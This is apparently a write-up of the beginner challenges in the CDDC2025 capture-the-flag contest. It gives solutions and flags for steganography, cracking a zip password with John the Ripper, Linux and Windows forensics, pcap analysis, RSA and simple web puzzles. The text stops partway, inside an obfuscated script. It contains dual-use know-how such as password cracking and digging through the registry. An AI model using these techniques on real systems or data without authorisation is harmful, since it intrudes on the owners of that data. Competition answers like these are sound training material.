# Table of Contents

- [Table of Contents](#table-of-contents)
- [Basics](#basics)
  - [Fundamentals of Cybersecurity](#fundamentals-of-cybersecurity)
    - [Welcome](#welcome)
    - [Katze](#katze)
    - [101](#101)
    - [Our secret](#our-secret)
    - [Silver dime](#silver-dime)
    - [Super calc](#super-calc)
  - [Fundamentals of Linux](#fundamentals-of-linux)
    - [Reversed hidden flag](#reversed-hidden-flag)
    - [random fruit](#random-fruit)
    - [Find File](#find-file)
    - [Unknown Program](#unknown-program)
  - [Fundamentals of Windows](#fundamentals-of-windows)
    - [fast console flag](#fast-console-flag)
    - [traces left in the registry](#traces-left-in-the-registry)
    - [Is it javascript?](#is-it-javascript)
    - [My Startup Program](#my-startup-program)
    - [animal farm](#animal-farm)
    - [Chill guy](#chill-guy)
    - [Gentleman's History](#gentlemans-history)
    - [Excel hidden flag](#excel-hidden-flag)
  - [Introduction to Networking](#introduction-to-networking)
    - [F4K3](#f4k3)
    - [HTTP](#http)
    - [ICMP](#icmp)
    - [TELNET](#telnet)
  - [Introduction to Malware](#introduction-to-malware)
    - [INJECTOR](#injector)
    - [Script\_Drop](#script_drop)
    - [Doc\_drop](#doc_drop)
    - [Encoded\_Code](#encoded_code)
  - [Introduction to Cryptography](#introduction-to-cryptography)
    - [secretextus](#secretextus)
    - [confusion](#confusion)
    - [ezRSA](#ezrsa)
    - [RSA-uth](#rsa-uth)
  - [Introduction to Web Security](#introduction-to-web-security)
    - [Are you robot](#are-you-robot)
    - [COOKIE](#cookie)
    - [Automation](#automation)
    - [(\['\_'\])](#_)
  - [Introduction to Hardware CWE](#introduction-to-hardware-cwe)
    - [What\_is\_the\_vuln](#what_is_the_vuln)
    - [What\_Weakness\_Does\_This\_Reflect](#what_weakness_does_this_reflect)
    - [SHADOWWRITE](#shadowwrite)
    - [JTAG\_MADNESS](#jtag_madness)
    - [Knockin' on Heaven's Vault \[UNSOLVED\]](#knockin-on-heavens-vault-unsolved)
- [Advanced](#advanced)
  - [Open Source Intelligence (OSINT)](#open-source-intelligence-osint)
    - [declassified](#declassified)
    - [past](#past)
    - [What\_kind\_of\_technology\_is\_it](#what_kind_of_technology_is_it)
    - [connections](#connections)
    - [livestream](#livestream)
    - [WHOISTHISPOKEMON](#whoisthispokemon)
    - [WHERETHEHACKAMI](#wherethehackami)
    - [Gold Chain](#gold-chain)
  - [Network Security](#network-security)
    - [WHOLOGIN](#whologin)
    - [PROTOCOL](#protocol)
    - [WhatsTHEPASS](#whatsthepass)
    - [CaptureTHE\_Flag](#capturethe_flag)
    - [MSGFromSRC](#msgfromsrc)
    - [WHOISINBETWEEN](#whoisinbetween)
    - [DR0N3CAM \[UNSOLVED\]](#dr0n3cam-unsolved)
    - [EyeUs33300Plus2600](#eyeus33300plus2600)
  - [Web Exploitation](#web-exploitation)
    - [NJOWNTE](#njownte)
    - [THETEMP](#thetemp)
    - [INJECTED\_YES](#injected_yes)
    - [BROKEN\_LOGIN](#broken_login)
    - [FINDPASSWORD](#findpassword)
    - [SSRF1 \[UNSOLVED\]](#ssrf1-unsolved)
    - [SSRF2 \[UNSOLVED\]](#ssrf2-unsolved)
    - [FASTFORWARD \[UNSOLVED\]](#fastforward-unsolved)
  - [Cyber Forensics](#cyber-forensics)
    - [mystery](#mystery)
    - [tower](#tower)
    - [doctor](#doctor)
    - [C3rt1f1cAt3](#c3rt1f1cat3)
    - [SERVER\_LOCATION](#server_location)
    - [THE\_CITY](#the_city)
    - [dimensional](#dimensional)
    - [IPIntheScript](#ipinthescript)
  - [Reverse Engineering](#reverse-engineering)
    - [CHIMERA](#chimera)
    - [Uandme](#uandme)
    - [TheBOX](#thebox)
    - [ECHO](#echo)
    - [HOmeTradingSystem](#hometradingsystem)
    - [WOLVES](#wolves)
    - [TheGateKeeper](#thegatekeeper)
    - [BEAR](#bear)
  - [Binary Exploitation](#binary-exploitation)
    - [TH3BRAV3 \[UNSOLVED\]](#th3brav3-unsolved)
    - [CANUSAYHELLO \[UNSOLVED\]](#canusayhello-unsolved)
  - [Cryptography](#cryptography)
    - [AEz](#aez)
    - [persistence](#persistence)
    - [flipflop \[UNSOLVED\]](#flipflop-unsolved)
    - [pico](#pico)
    - [transmision](#transmision)
    - [compartido \[UNSOLVED\]](#compartido-unsolved)
    - [crackers](#crackers)
    - [collision \[UNSOLVED\]](#collision-unsolved)
  - [Cloud Security](#cloud-security)
    - [EXPOSEDBINARY](#exposedbinary)
    - [IAM-EScAlAT10n](#iam-escalat10n)
    - [L4mbDa-S3cret5](#l4mbda-s3cret5)
    - [l33aky-s3-Buck3t](#l33aky-s3-buck3t)
    - [55rf-m3tadat4](#55rf-m3tadat4)

# Basics

## Fundamentals of Cybersecurity

### Welcome

Flag is given: `CDDC2025{vvelc0m3_bra1nh4cker5!}`

### Katze

`nc 52.76.13.43 8085`

Welcome defender! You're on the right path to get the flag, answer questions first!  
Which port does SSH use? (No spaces, lowercase): 22  
Which port does SMTP use? (No spaces, lowercase): 25  
Which port does HTTPS use? (No spaces, lowercase): 443  
Correct! Here is your flag: `CDDC2025{netcat_challenge_success}`

### 101

Given a text file "this_is_yours.txt" containing binary values 1 and 0s inside.

Use [Cyberchef](https://gchq.github.io/CyberChef/) to convert from binary to string, you will find the flag in between: `CDDC2025{hidden_in_binary}`

### Our secret

Given an image: `kapow.jpg`. Use  `steghide` and found that the flag is hidden and obtain the flag

```bash
$ steghide info kapow.jpg
"kapow.jpg":
  format: jpeg
  capacity: 15.5 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase:
  embedded file "flag.txt":
    size: 34.0 Byte
    encrypted: rijndael-128, cbc
    compressed: yes
$ steghide extract -sf kapow.jpg
Enter passphrase:
wrote extracted data to "flag.txt".
$ cat flag.txt
CDDC2025{Kap00vv_congratulations}
```

### Silver dime

Given a zip file `hohoho.zip`

1. **Extract the hash for cracking:**
   Now that we have the hello_there.zip file, we use the `zip2john` utility to extract the hash for password cracking:

   ```bash
   $ zip2john hohoho.zip > hash.txt
   ver 1.0 efh 5455 efh 7875 hohoho.zip/hmm.txt PKZIP Encr: 2b chk, TS_chk, cmplen=38, decmplen=26, crc=8C6C580E ts=1A70 cs=1a70 type=0
   ```

2. **Crack the password using John the Ripper:** 
   We run John the Ripper with a wordlist (`rockyou.txt`) to crack the password:

   ```bash
    $ john --wordlist=rockyou.txt hash.txt
   
    Using default input encoding: UTF-8
    Loaded 1 password hash (PKZIP [32/64])
    Will run 18 OpenMP threads
    Note: Passwords longer than 21 [worst case UTF-8] to 63 [ASCII] rejected
    Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
    12345678         (hohoho.zip/hmm.txt)
    1g 0:00:00:00 DONE (2025-05-07 09:52) 25.00g/s 921600p/s 921600c/s 921600C/s 123456..holabebe
    Use the "--show" option to display all of the cracked passwords reliably
    Session completed.
    ```

    The cracked password for the zip file is `12345678`.

3. **Extract the contents of the zip file:**
   Using the cracked password, we unzip the hohoho.zip file:

   ```bash
   $ unzip hohoho.zip
   ```

   This gives us a text file: `hmm.txt`.

4. **Retrieve the flag:**
   Opening the `hmm.txt` file reveals the flag:  
   The flag is: `CDDC2025{cr4ck3d_m3_fast}`.

### Super calc

We were provided with an IP address and port. Upon connecting, the server sends a series of simple arithmetic problems, where after inputting one answer, the next question is shown:

```bash
$ nc 52.76.13.43 8084
What is
2 + 3 = 5
6 + 2 =
```

The python script below is used to auto solve the math problems:

```python
import socket
import re

HOST = '52.76.13.43'
PORT = 8084

def solve_expression(expr):
    try:
        return str(eval(expr))
    except Exception:
        return ''

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((HOST, PORT))
    s.settimeout(2)

    while True:
        try:
            data = s.recv(1024)
            if not data:
                break

            text = data.decode()
            print(text, end='')  # Show what server sent

            # Match patterns like "2 + 3 ="
            match = re.search(r'(\d+)\s*([+\-*/])\s*(\d+)\s*=', text)
            if match:
                a, op, b = match.groups()
                expr = f"{a}{op}{b}"
                answer = solve_expression(expr)
                print(f"\nAnswering: {answer}")
                s.sendall((answer + '\n').encode())

        except socket.timeout:
            continue
        except KeyboardInterrupt:
            print("\nConnection closed by user.")
            break
```

It successfully solved the problems continuously. Eventually, the server responded with the flag:

```bash
What is
8 * 8 =
Answering: 64
5 + 9 =
Answering: 14
.
.
.
9 + 2 =
Answering: 11
Here is your flag CDDC2025{5uP3r_p0W3r3d_c4lCuL4t0r}
```

## Fundamentals of Linux

### Reversed hidden flag

We connect to a remote service at 52.76.13.43:8086. The server contains three flag files: flag_1.txt, flag_2.txt, and flag_3.txt.

1. **Check files:**

   ```bash
    $ nc 52.76.13.43 8086
    ls
    flag_1.txt
    flag_2.txt
    flag_3.txt
   ```

2. **Read `flag_1.txt`:**

   ```
   cat flag_1.txt
   !noitalutargnoC
   ```

   *(just “Congratulations!” reversed)*

3. **Read `flag_2.txt`:**

   ```
   cat flag_2.txt
   _t1{5202CDDC si galf
   ```

   This is **reversed**, so we reverse it:

   ```bash
   cat flag_2.txt | rev
   flag is CDDC2025{1t_
   ```

4. **Check `flag_3.txt`:**
   ```bash
    ls -al
    total 20
    dr-xr-xr-x 1 root    root    4096 Apr  3 01:21 .
    drwxr-xr-x 1 root    root    4096 Apr  2 02:01 ..
    -r--r--r-- 1 ctfuser ctfuser   16 Apr  2 02:01 flag_1.txt
    -r--r--r-- 1 ctfuser ctfuser   21 Apr  3 01:21 flag_2.txt
    lrwxrwxrwx 1 root    root      28 Apr  3 01:21 flag_3.txt -> /opt/flag_storage/flag_3.txt
   ```
   It’s a **symlink** pointing to `/opt/flag_storage/flag_3.txt` but that file has no read permission.
   We notice a hidden file `.flag_3.txt` in the same directory:

   ```
    ls /opt/flag_storage -al
    total 24
    drwxr-xr-x 1 root    root    4096 Apr  3 01:21 .
    drwxr-xr-x 1 root    root    4096 Apr  3 01:21 ..
    -r--r--r-- 1 ctfuser ctfuser   17 Apr  3 01:21 .flag_3.txt
    ---------- 1 root    root      17 Apr  3 01:21 flag_3.txt
   ```

5. **Read hidden file:**

   ```bash
   cat /opt/flag_storage/.flag_3.txt
   }n3dd1h_t5uj_54W
   ```

   This is also **reversed**, so we reverse it:

   ```bash
   cat /opt/flag_storage/.flag_3.txt | rev
   W45_ju5t_h1dd3n}
   ```

6. **Final flag:**

    We combine the reversed parts, flag is `CDDC2025{1t_` + `W45_ju5t_h1dd3n}`  
    The complete flag is:`CDDC2025{1t_W45_ju5t_h1dd3n}`

### random fruit

We’re given a remote service at 52.76.13.43:8087. After connecting with nc, we see a file named fruits. Running it just prints a random fruit.

Instead of interacting further, we check if the flag is hardcoded inside the binary by using strings, and we find the flag in the output:

```bash
$ strings fruits
...
Apple
Banana
...
CDDC2025{this_is_Random_fruits}
...
```

### Find File

We found a desktop left in one of Cypher's lookouts. On the desktop, there are flag-related files in the `flag` folder. One of the files have a different file type. 

1. **Navigating to the Target Directory and List the Files**  
   ```bash
   cd Desktop
   ls
   ```

2. **Checking File Types**  
   We checked the file type using:  
   ```bash
   file flag*/*
   ```

3. **Observations**  
   The majority of the files returned `"ASCII text"` as their type, but one stood out—it was categorized as `"data"`, which is what we are looking for.
   ```bash
    ...
    flag54/Y0u_F1nd_Me54.txt:   ASCII text
    flag55/Y0u_F1nd_Me55.txt:   ASCII text
    flag56/Y0u_F1nd_Me56.txt:   data
    flag57/Y0u_F1nd_Me57.txt:   ASCII text
    flag58/Y0u_F1nd_Me58.txt:   ASCII text
    flag59/Y0u_F1nd_Me59.txt:   ASCII text
    flag6/Y0u_F1nd_Me6.txt:     ASCII text
    ...
   ```

The flag is: `CDDC2025{Y0u_F1nd_Me56}`

### Unknown Program
The desktop from Cypher's lookout has an unknown software installed. Default password of it seems to be exposed.
Can you find it?  
`nc 52.76.13.43 8089`

First, we check paths that could be associated with software installed, and we found `unkown` in `/opt/`.
`/opt/` is usually reserved for manually installed or third-party software (e.g., custom apps, proprietary software). We check the contents of unknown and found the following:

```bash
cd /opt/unknown
ls -al
total 20
drwxr-xr-x 1 root root 4096 Apr  2 02:03 .
drwxr-xr-x 1 root root 4096 Apr  2 02:03 ..
-r-xr--r-- 1 root root  251 Apr  2 02:03 identify_flag.sh
cat identify_flag.sh
#!/bin/bash

shopt -s nullglob
for file in /var/identify/*.sh; do
    if [[ -x "$file" ]]; then
        result=$(bash "$file")
    else
        result="Permission denied (not executable)"
    fi
    echo -e "$file executed:\n$result" >> ./log.log
done
```

We move on to check `/var/identify/` where we found another script:

```bash
ls -l /var/identify/
total 4
-r-xr--r-- 1 root root 1171 Apr  2 02:03 makeuser.sh
cat /var/identify/makeuser.sh
#!/bin/bash

default_passwd_file="/var/identify_file/userlist/Default_passwd.txt"
user_list_file="/var/identify_file/userlist/user.txt"
readme_file="/var/identify_file/Readme.md"

if [[ ! -f "$default_passwd_file" ]]; then
    echo "Error: Default_passwd.txt not found!" >&2
    exit 1
fi
default_password=$(cat "$default_passwd_file")

if [[ ! -f "$user_list_file" ]]; then
    echo "Error: user.txt not found!" >&2
    exit 1
fi

while IFS= read -r user; do
    [[ -z "$user" ]] && continue

    if id "$user" &>/dev/null; then
        echo "User $user already exists, skipping..."
    else
        sudo useradd -m "$user"
        echo "$user:$default_password" | sudo chpasswd
        echo "User $user created with default password."
    fi
    user_home="/home/$user"
    if [[ ! -d "$user_home" ]]; then
        sudo mkdir -p "$user_home"
        sudo chown "$user:$user" "$user_home"
    fi

    bashrc_file="$user_home/.bashrc_profile"
    if [[ ! -f "$bashrc_file" ]]; then
        sudo touch "$bashrc_file"
        sudo chown "$user:$user" "$bashrc_file"
    fi

    echo "cat \"$readme_file\"" | sudo tee -a "$bashrc_file" > /dev/null
done < "$user_list_file"
```

So we moved on to check the path `/var/identify_file` and we found the flag:

```bash
ls /var/identify_file
Readme.md
userlist
cat /var/identify_file/Readme.md
Welcome to the Ubuntu system.
The currently assigned password is likely the default password!
Default password: CDDC2025{W0w_Y0U_F0UnD_1T!}

If you are logging in for the first time, make sure to change the default password!
Any consequences resulting from failing to change the password will be the responsibility of the user.

Enjoy using Ubuntu :)
```

The flag found is: `CDDC2025{W0w_Y0U_F0UnD_1T!}`

## Fundamentals of Windows

### fast console flag
Given a file `fast_console_flag.exe`, run the file and check the flag that prints on the console. It goes super fast, so you will have to be even faster!  
To run a windows executable file, install `wine` using `sudo apt install wine` (may need other configurations, do as instructed) and to obtain the flag, redirect the output to a file: `wine fast_console_flag.exe > output.txt`

Alternatively, create a .bat file in the same folder. Open Notepad and write:  
```bash
@echo off
fast_console_flag.exe
pause
```
Save it as run_with_pause.bat in the same folder (choose "All Files" for file type). Double-click run_with_pause.bat to run → the console will stay open after execution. Other similar ways to output the content directly using command prompt/ powershell should work as well!

### traces left in the registry
Programs do not print anything, but they leave important information somewhere in the system. In the Windows system, find the area where the user's software settings are saved!  
File's password : reg

software settings are usually saved under: `HKEY_CURRENT_USER\Software` or `HKEY_LOCAL_MACHINE\Software`. When you run those executables, they are likely writing keys or values into the Windows registry.

1. Run the executables normally (double-click or from CMD)
2. Check registry changes in `regedit`. Press `Win + R`, type `regedit`, press Enter.
3. Browse to: `HKEY_CURRENT_USER\Software`
4. You will find the flag under `HKEY_CURRENT_USER\Software\CTF_Easy` OR you can youse 'find' feature to look for 'CDDC which also gives the flag in that path

The flag found is: `CDDC2025{ReG_hAcK}`

### Is it javascript?
We are given a `flag.txt` that looks like below:
```text
[][(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+
[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+
[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+
...
```
This is JSFuck. Parse it into a [JSFuck de-obfuscator](https://enkhee-osiris.github.io/Decoder-JSFuck/) we get the flag: `CDDC2025{YES_1t_1S_JAVA2CR1pt!}`.

### My Startup Program
Given a 'registry.txt', find the name of the startup program that is configured. Look for 'Run Keys' (Programs that start when a user logs in) which is in `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run` or `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run`. We found the flag in:
```text
[HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]
"Imadeit"="C:\\Program Files (x86)\\HeHe\\W3ll_d0n3_Y0u_F0un[)_17.exe"
```
The flag is: `CDDC2025{W3ll_d0n3_Y0u_F0un[)_17}`

### animal farm

```bash
$xxd Tiger.png | tail
0008e640: 4344 4400 0000 0000 0000 0000 0000 0000  CDD.............
0008e650: 4332 3000 0000 0000 0000 0000 0000 0000  C20.............
0008e660: 3235 7b00 0000 0000 0000 0000 0000 0000  25{.............
0008e670: 614e 6900 0000 0000 0000 0000 0000 0000  aNi.............
0008e680: 4d61 3100 0000 0000 0000 0000 0000 0000  Ma1.............
0008e690: 5f46 6100 0000 0000 0000 0000 0000 0000  _Fa.............
0008e6a0: 526d 5f00 0000 0000 0000 0000 0000 0000  Rm_.............
0008e6b0: 5332 4300 0000 0000 0000 0000 0000 0000  S2C.............
0008e6c0: 7245 7400 0000 0000 0000 0000 0000 0000  rEt.............
0008e6d0: 7d                                       }
```

The flag found is: `CDDC2025{aNiMa1_FaRm_S2CrEt}`

### Chill guy
A quiz from Philb, Dex's colleague.
Philb said, "Use Chill.jpg to find the answer."
I asked for the password, but he just repeated his name.

Note: 'Start.exe' is safe to run but modifies the Windows registry.  
Run 'Clean.exe' afterward to remove the changes.  

Given a zip file `Chill guy.zip` we use the password `philb` (given as hint in the question) to unzip it. Run `Start.exe` and search `chill` in registry, we found the flag: `CDDC2025{Chill1111111111111111_9uy}`

### Gentleman's History
We are given a file `History`.

After examining the file, we realize it is an SQLite 3.x database.

```bash
$ file History
History: SQLite 3.x database, last written using SQLite version 3046000, file counter 75, database pages 174, cookie 0x25, schema 4, UTF-8, version-valid-for 75
```

We explore the db file using an [online sql viewer](https://sqliteviewer.app/) and found the flag under `urls` table, filter with `cddc` and found an url containing the flag:
```text
http://cddc.dstabrainhack.com/?id=12345&user=johndoe&email=johndoe%40email.com&age=25&gender=male&
country=US&city=NewYork&zip=10001&phone=123-456-7890&dob=1995-08-15&status=active&balance=1520.75&
points=2500&membership=premium&last_login=2025-03-30T14%3A30%3A00Z&referrer=google.com&
session_id=abcde12345&cart_id=xyz67890&fl4g=d08df2b8de382d42c60e116368c3ee799e00f286&device=mobile&
ip=192.168.1.1&browser=chrome&os=windows&app_version=1.2.3&subscription=true&newsletter=false&
timezone=UTC-5&language=en&theme=dark&tracking_id=trk_98765&discount_code=SPRING50
```
which contains: `fl4g=d08df2b8de382d42c60e116368c3ee799e00f286`  

The flag is: `CDDC2025{d08df2b8de382d42c60e116368c3ee799e00f286}`

### Excel hidden flag
Given an excel file `excel_hidden_flag.xlsx`. We need to examine it and find the flag hidden inside it. By using `strings` we found that there's hidden XML files. We use the following command to extract them:
```bash
$ unzip excel_hidden_flag.xlsx -d xlsx_contents/
Archive:  excel_hidden_flag.xlsx
warning:  excel_hidden_flag.xlsx appears to use backslashes as path separators
  inflating: xlsx_contents/docProps/app.xml
  inflating: xlsx_contents/docProps/core.xml
  inflating: xlsx_contents/xl/sharedStrings.xml
  inflating: xlsx_contents/xl/styles.xml
  inflating: xlsx_contents/xl/workbook.xml
  inflating: xlsx_contents/xl/theme/theme1.xml
  inflating: xlsx_contents/xl/worksheets/sheet1.xml
  inflating: xlsx_contents/xl/_rels/workbook.xml.rels
  inflating: xlsx_contents/_rels/.rels
  inflating: xlsx_contents/[Content_Types].xml
```

And we found the flag in the extracted contents:
```bash
$ grep -r "CDDC" .
./xlsx_contents/xl/sharedStrings.xml:<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" 
count="1" uniqueCount="1"><!--  Congratulation! flag is CDDC2025{3xcEl_H1dden_fl4g}  --><si><t>Hint: Flags hidden somewhere</t><phoneticPr fontId="1"/></si></sst>
```

The flag is: `CDDC2025{3xcEl_H1dden_fl4g}`

## Introduction to Networking

### F4K3
Visit the link `http://52.76.13.43:8149/`. It hints: *Cheating the other person's common sense and eyes is also part of security. Don't believe what you see as it is.* and a file `fake_capture.pcapng`. Examining the packets, we found the flag.  
The flag is: `CDDC2025{Sometimes_what_you_see_may_not_be_all_that_you_see}`

### HTTP
Destination tried to log in from a web page using HTTP. Find your ID and password and get the flag. Similarly, visit the link `http://52.76.13.43:8129/`, download the `http_capture.pcapng` file and found the packet with information about the flag: `uname=CDDC2025%7B%7D&pass=I_use_a_password_of_more_than_10_digits%21`.  

The flag is: `CDDC2025{I_use_a_password_of_more_than_10_digits!}`

### ICMP
This time we need to examine the ICMP packets. Similarly, visit the link `http://52.76.13.43:8130/`, download the `ping_capture.pcapng` file and use the command line to extract the flag: `tshark -r ping_capture.pcapng -Y "icmp.type==0" -T fields -e data | xxd -r -p`.  

The flag is: `CDDC2025{I_Love_ICMP}`

### TELNET
This time we look at the telnet packets. Similarly, visit the link `http://52.76.13.43:8131/`, download the `telnet_capture.pcapng` file and we found the flag.

The flag is: `CDDC2025{Use_SSH_Instead_Of_Telnet}`

## Introduction to Malware

### INJECTOR
Run `strings` on `malware.exe` to find the flag.  
The flag is: `CDDC2025{You_Found_Me_Hiding?}`

### Script_Drop
Run `cat` on `script.js` to find the flag.  
The flag is: `CDDC2025{Malware_Can_Be_Disguised_As_JavaScript}`

### Doc_drop

Similarly, given a file `Document.xlsm`. We need to examine it and find the flag hidden inside it. We use the following command to extract them:
```bash
$ unzip Document.xlsm -d xlsm_contents/
Archive:  Document.xlsm
  inflating: xlsm_contents/[Content_Types].xml
  inflating: xlsm_contents/_rels/.rels
  inflating: xlsm_contents/xl/workbook.xml
  inflating: xlsm_contents/xl/_rels/workbook.xml.rels
  inflating: xlsm_contents/xl/worksheets/sheet1.xml
  inflating: xlsm_contents/xl/theme/theme1.xml
  inflating: xlsm_contents/xl/styles.xml
  inflating: xlsm_contents/xl/sharedStrings.xml
  inflating: xlsm_contents/xl/vbaProject.bin
  inflating: xlsm_contents/docProps/core.xml
  inflating: xlsm_contents/docProps/app.xml
```

And we found the flag in the extracted contents:
```bash
$ grep -r "CDDC" ./xlsm_contents/
grep: ./xlsm_contents/xl/vbaProject.bin: binary file matches
$ strings -tx ./xlsm_contents/xl/vbaProject.bin | grep "CDDC2025"
    c7d CDDC2025{You_Have_Learned_To_Dropper}
```

The flag is: `CDDC2025{You_Have_Learned_To_Dropper}`

### Encoded_Code

We are given a file `Encoded Code.txt`. It is encoded in base-92 encoding. Decoding it, we obtain the flag.  
The flag is: `CDDC2025{Did_You_Even_Know_This?}`

## Introduction to Cryptography

### secretextus

We were given the encoded URL: `lxxtw://tewxifmr.gsq/ZyLJTmIy`  
Using ROT-13 (-4), which implies shifting characters backward by 4 positions in the alphabet, we get the decoded url: `https://pastebin.com/VuHFPiEu`. Opening the Pastebin link reveals the flag, completing the challenge.

The flag is: `CDDC2025{cl4ssic_ciph3rs_n3ver_g3t_0ld}`

### confusion

We were given a ciphertext that required decryption using substitution cipher techniques. The flag could be extracted by performing frequency analysis on the encrypted text. The text appears to be encrypted using monoalphabetic substitution, a classical cryptographic method where each letter in the plaintext is replaced with another letter. Substitution ciphers can be broken by analyzing the frequency of letter occurrences. Common letters in English (e, t, a, o, i, n, s, h, r) help identify probable mappings. Using an [online tool solver](https://www.guballa.de/substitution-solver) helps to extract the decrypted text, confirming the flag.  

The key found is:  
abcdefghijklmnopqrstuvwxyz  
jypifnsxwbogqvumacdhrtkzle  

The flag is: `CDDC2025{frequency_analysis_attack_on_substitution_cipher}`

### ezRSA

We are given the following information, parse them into an [online RSA solver](https://www.dcode.fr/rsa-cipher) and we get the flag:
```text
p = 11761009148495337545940999396205089807793355019204841643389748701443098007636228251201607196675918854587390323421928481912561291511618554667920837883094277
q = 9888136228081414209820676558226657144779627238665715838177426712845225636870713659693703226404260564674108420042074230352505763500068502502134647674251687
n = 116294460640033692143626306435891843122522599938940757452462911853125465582642144709612488762049012386016267798344721744397095276260624787992959891643706367183181737728205018889190090478186479836306983686854003107071206589145587398271398134923545870065377561092155233897560409036379963882175774245044047295299
e = 65537
c = 14835012875317003605883938595936119637451953528880769153793116132790662871832095046458402419500656318334971732237256236272170615288151356860206746811892224571924385041617143437615146289340076230180092874417012757848195740691520839356019149216366091585771821578871824405230102599335275676294493457954893895832
```

The flag is: `CDDC2025{g00d_j0b_0n_5olv1ng_RSA}`

### RSA-uth

Given:  
Public key `(e, n)`

```text
s = 85892532985662395139838514515158823905349593308214862429283609141649741846672197958669601256449840891725682966866371284301993566066378236907643444107123328714956604314395929777948179586950988863445216269652405441518965133030169918785510456485380433653165909033983343858003128056034066677427176138770557722479
e = 65537
n = 95239736094653792802729363779925863685618792811821814281009993752030105473838436150966226635373433699683182625967915422723626510376598774609858165820089385545775468124477762093854205035583324437310842677488823012406455736633146810479993842984180024216532817861977930991914062061120104137043036944501823943091
```

A value `s` generated as: `s = pow(m, d, n)`
chall.py:
```python
from Crypto.Util.number import *

flag = b"CDDC2025{REDACTED}"
m = bytes_to_long(flag)

p = getPrime(512)
q = getPrime(512)
e = 65537
n = p*q
phi = (p-1)*(q-1)
d = pow(e,-1,phi)

s = pow(m,d,n)

print(f"s = {s}")
print(f"e = {e}")
print(f"n = {n}")
```

We’re told:

$$𝑠 = m^d\mod{n}$$
This is an RSA signature.

Dex signed the message `m` with his private key `d`, resulting in signature `s`.

Anyone can verify the message came from Dex by decrypting `s` with the public key `(e, n)`:

$$m^′=s^e\mod{n}$$

This will recover the original `m`.

Once we have `m`, convert it from integer to bytes to get the flag.

```python
from Crypto.Util.number import long_to_bytes

s = 85892532985662395139838514515158823905349593308214862429283609141649741846672197958669601256449840891725682966866371284301993566066378236907643444107123328714956604314395929777948179586950988863445216269652405441518965133030169918785510456485380433653165909033983343858003128056034066677427176138770557722479
e = 65537
n = 95239736094653792802729363779925863685618792811821814281009993752030105473838436150966226635373433699683182625967915422723626510376598774609858165820089385545775468124477762093854205035583324437310842677488823012406455736633146810479993842984180024216532817861977930991914062061120104137043036944501823943091

m_prime = pow(s, e, n)
flag = long_to_bytes(m_prime)

print(flag)
```

`pow(s, e, n)` raises `s` to `e` modulo `n`, effectively verifying the signature. We convert the number back to bytes using `long_to_bytes`.

This challenge demonstrates RSA digital signatures:  
Normally, RSA encrypts with public key, decrypts with private key. To authenticate a message, RSA reverses roles: 1) sign: encrypt message with private key → `s = mᴰ mod n`, 2) verify: decrypt with public key → `m' = sᴱ mod n`. Anyone with the public key can confirm the message was signed by Dex (owner of private key).  

The flag is: `CDDC2025{it5_0nly_m3_wh0_kn0w_my_priv4te_k3y_ther3fore_1ts_m3}`

## Introduction to Web Security

### Are you robot

Visited the challenge website `http://52.76.13.43:8137/`, the hint tells us to check if there was a robots.txt file by going to: `http://52.76.13.43:8137/robots.txt` which displayed:

```text
User-agent: *
Allow: /
Disallow: /20041703007178440570148307553336
```

This meant that web crawlers were told not to access the path /20041703007178440570148307553336.

In CTF challenges, disallowed paths in robots.txt are often hiding something interesting, like a flag or a clue. Visit the link and you will find the flag: `http://52.76.13.43:8137/20041703007178440570148307553336`

The flag is: `CDDC2025{You_can_find_the_page_that_the_administrator_wants_to_hide}`

### COOKIE

This is a simple challenge. Open the url, click the link on the page, and check the cookies and you will find the flag.

The flag is: `CDDC2025{A_VERY_DELICIOUS_COOKIE}`

### Automation

When accessing the challenge website at `http://52.76.13.43:8138/`, there's many buttons labeled as different pages (like page1, page2, etc.). Clicking each button redirected me to /page/1, /page/2, and so on, with each page showing a single letter or a message `"Here is nothing for you"`. The goal was to visit all these pages and collect the letters to form the flag.

To automate the process, use a simple loop to request each page and print the letters only if the response wasn’t the “nothing” message. After visiting all pages and combining the letters, the flag is obtained:
```bash
for x in {1..102}; 
do result=$(curl -s "http://52.76.13.43:8138/page/$x"); 
[[ "$result" != "Here is nothing for you" ]] && echo -n "$result"; 
done
```

The flag is: `CDDC2025{Well_done_collecting_everything}`

### (['_'])

When accessing the challenge website at `http://52.76.13.43:8136/`, there is an input box and a button to check the input. Inspect the page source and found a `<script>` tag containing an obfuscated JavaScript function:

```html
<script>
    function checkInput() {
    ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //*´∇｀*/ ['_']; o=(ﾟｰﾟ)  =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)={ﾟΘﾟ: '_' ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +'_') [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ '_')[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +'_')[ﾟｰﾟ] }; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +'_') [c^_^o];(ﾟДﾟ) ['c'] = ((ﾟДﾟ)+'_') [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) ['o'] = ((ﾟДﾟ)+'_') [ﾟΘﾟ];
